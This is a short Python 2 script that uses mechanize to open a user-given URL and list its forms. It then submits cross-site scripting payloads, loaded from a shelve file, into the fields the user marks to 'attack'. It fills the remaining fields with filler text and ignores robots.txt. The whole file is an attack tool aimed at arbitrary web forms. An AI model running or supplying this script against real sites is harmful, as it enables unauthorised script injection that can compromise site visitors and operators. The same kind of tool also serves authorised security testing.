import mechanize
import shelve
br = mechanize.Browser()
br.set_handle_robots( False )
url = raw_input("Enter URL ")
br.set_handle_equiv(True)
br.set_handle_gzip(True)
#br.set_handle_redirect(False)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.open(url)
s = shelve.open("mohit.xss",writeback=True)
for form in br.forms():
	print form
list_a =[]
list_n = []
field = int(raw_input('Enter the number of field "not readonly" '))
for i in xrange(0,field):
	na = raw_input('Enter the field name, "not readonly" ')
	ch = raw_input("Do you attack on this field? press Y ")
	if (ch=="Y" or ch == "y"):
		list_a.append(na)
	else :
		list_n.append(na)

br.select_form(nr=0)

p =0
flag = 'y'
while flag =="y":
	br.open(url)
	br.select_form(nr=0)
	for i in xrange(0, len(list_a)):
		att=list_a[i]
		br.form[att] = s['xss'][p]
	for i in xrange(0, len(list_n)):
		non=list_n[i]
		br.form[non] = 'aaaaaaa'
	
	print s['xss'][p]
	br.submit()
	ch = raw_input("Do you continue press y ")
	p = p+1
	flag = ch.lower()

		

	
